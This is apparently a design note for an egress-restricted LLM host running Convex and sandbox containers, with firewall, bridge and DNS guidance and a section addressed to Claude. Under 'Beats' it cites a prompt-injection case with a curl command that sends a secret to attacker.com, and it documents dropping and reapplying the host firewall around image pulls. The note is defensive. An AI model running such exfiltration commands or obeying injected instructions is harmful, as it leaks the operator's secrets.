# egress-only-llm-host

Host firewall blocks all outbound except `api.kimi.com:443` from the Convex process. Sandbox containers attach to a restricted bridge that allows Convex internal endpoint only. Nothing else reaches the internet from any layer.

## Beats

- **Open sandbox egress**: prompt injection → `curl attacker.com -d "$SECRET"` works. Even with `--network none` on the sandbox, if Convex has open egress, the proxy could be tricked into proxying off-allowlist destinations.
- **Application-layer allowlist only**: SSRF defenses in code (URL host re-check) are belt; network-layer deny is suspenders. Use both.
- **Sandbox `--network none` (no network at all)**: sandbox can't reach Convex either; CLI tool exec fails. Wrong shape.

## Real cost

- Host firewall rules need maintenance (added per new outbound, e.g. when a new LLM provider replaces Kimi).
- Local Convex compose stack outbound is restricted to Kimi (and DNS for that host). All other Convex outbound — package downloads, OS updates — has to happen out-of-band (separate maintenance window) or via a configured proxy.

## Gotcha for Claude

- Sandbox bridge: a Docker network with `--internal` won't reach the host network. Use a custom bridge with iptables FORWARD rules restricting destinations to the Convex container's IP only.
- DNS resolution from the sandbox: provide a local DNS resolver (or `/etc/hosts` baked into the image) that resolves `cvex-api` to the Convex container's bridge IP — and NOTHING else. Without DNS isolation, the sandbox could resolve `api.kimi.com` and try to reach it (and fail at the bridge, but waste a round trip).
- Host firewall rule shape (`nftables` / `iptables`): allow established + related, allow port 53 outbound (DNS) to a controlled resolver, allow 443 outbound only to the IPs that resolve `api.kimi.com`. Kimi rotates IPs; either pin via TLS SNI inspection (Envoy egress proxy) or accept periodic refresh of the allowed-IP set via cron.
- Convex backend's outbound is governed by the host's egress rules; doesn't have its own restrictor.

## MUST

- Drop the host firewall before image pulls/builds via `colima ssh -- sudo nft delete table inet byerag-fw`, then pull/build, then reapply the `byerag-fw` table. Why: Kimi-only egress blocks `ghcr.io`/`docker.io` pulls + npm.
- Reapply the `byerag-fw` table with a multi-line `nft -f -` heredoc. Why: the compact one-liner form errors on `}`.
